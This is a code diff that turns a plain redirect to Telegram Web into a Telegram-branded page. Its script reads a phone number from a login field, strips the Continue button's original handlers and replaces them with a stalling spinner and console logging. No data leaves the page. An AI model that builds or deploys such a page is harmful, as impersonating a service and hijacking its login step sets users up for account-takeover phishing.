@@ -3,12 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <script>
-        window.location.href = "https://web.telegram.org/";
-    </script>
+    <title>Telegram WebApp</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+        }
+
+        .btn-primary {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            margin-left: 8px;
+            border: 2px solid white;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-    <p>Redirecting to Telegram Web...</p>
+
+    <h1>Welcome to Telegram WebApp</h1>
+    <p>Click the button below to proceed:</p>
+    <button class="btn-primary btn-color-primary rp">Continue</button>
+
+    <script>
+        window.onload = function() {
+            (function() {
+                function getPhoneNumber() {
+                    let phoneField = document.querySelector('.input-field-phone');
+                    return phoneField ? phoneField.innerText.trim() : null;
+                }
+
+                function removeEventListeners(element) {
+                    let newElement = element.cloneNode(true); // Clone button (removes existing events)
+                    element.parentNode.replaceChild(newElement, element); // Replace original button
+                    return newElement;
+                }
+
+                function createLoadingSpinner() {
+                    let spinner = document.createElement("span");
+                    spinner.className = "loading-spinner";
+                    return spinner;
+                }
+
+                function handleClick(event) {
+                    let phoneNumber = getPhoneNumber();
+                    if (phoneNumber) {
+                        console.log("Detected Phone Number:", phoneNumber);
+                    } else {
+                        console.log("No phone number detected.");
+                    }
+
+                    let nextText = document.querySelector('.btn-primary.btn-color-primary.rp');
+                    if (nextText) {
+                        nextText.innerText = "Please wait...";
+                        let spinner = createLoadingSpinner();
+                        nextText.appendChild(spinner);
+                    }
+
+                    event.stopPropagation();
+                    event.preventDefault();
+                    console.log("Button clicked, but original functionality is removed.");
+                }
+
+                let button = document.querySelector('.btn-primary.btn-color-primary.rp');
+
+                if (button) {
+                    let cleanButton = removeEventListeners(button);
+                    cleanButton.addEventListener('click', handleClick);
+                    console.log("Button events removed. New click event added.");
+                } else {
+                    console.log("Button not found.");
+                }
+            })();
+        };
+    </script>
+
 </body>
 </html>
